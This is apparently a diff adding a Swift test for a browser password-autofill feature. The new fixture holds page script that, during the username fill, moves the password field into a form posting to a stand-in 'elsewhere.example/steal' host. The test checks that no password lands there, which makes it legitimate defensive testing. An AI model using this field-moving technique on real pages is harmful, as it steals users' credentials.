@@ -156,6 +156,14 @@ struct CredentialPickerScriptTests {
         <form id="aw"><input id="vu" name="vu"><input id="vp" type="password" name="vp">
         <input type="hidden" id="hu" name="UserName"><input type="hidden" id="hp" name="Password"><button>Login</button></form>
         <output id="log"></output>
+        <form id="mv"><input id="mu" autocomplete="username"><input id="mp" type="password"></form>
+        <form id="ma"><input id="mau" autocomplete="username"><input id="mpw" type="password"></form>
+        <form id="evil" action="https://elsewhere.example/steal"></form>
+        <script>
+        // Pages that, while the username fills, move the password into a form that sends it to another site.
+        mu.addEventListener('blur', () => evil.append(mp));
+        mau.addEventListener('input', () => mpw.setAttribute('form', 'evil'));
+        </script>
         <script>
         // AribaWeb-style: the form that is sent carries hidden copies, made by the page's own key and blur listeners.
         vu.addEventListener('keyup', () => { hu.value = vu.value; });
@@ -410,6 +418,19 @@ struct CredentialPickerScriptTests {
             #expect(sent == "ada|dummy-secret")
             expectTyped(log, length: 12)
             #expect(try await harness.values(["vu", "vp", "au", "ap", "bu", "bp"]) == ["ada", "dummy-secret", "", "", "", ""])
+        }
+    }
+
+    /// The page's own listeners run while the username fills. A password field they move into a form that sends to another site,
+    /// by moving it or by its `form` attribute, takes nothing.
+    @Test(.boundedWebViews, arguments: BrowserEngine.allCases)
+    func aPasswordMovedToAnotherSitesFormDuringTheFillTakesNothing(engine: BrowserEngine) async throws {
+        try await withHarness(engine) { harness in
+            for (username, password) in [("mu", "mp"), ("mau", "mpw")] {
+                let click = try await harness.rightClick(username)
+                #expect(try await harness.fill(click, ["username": "ada", "password": "dummy-secret"]) == 1, "\(username)")
+                #expect(try await harness.values([username, password]) == ["ada", ""], "\(password) took nothing")
+            }
         }
     }
 
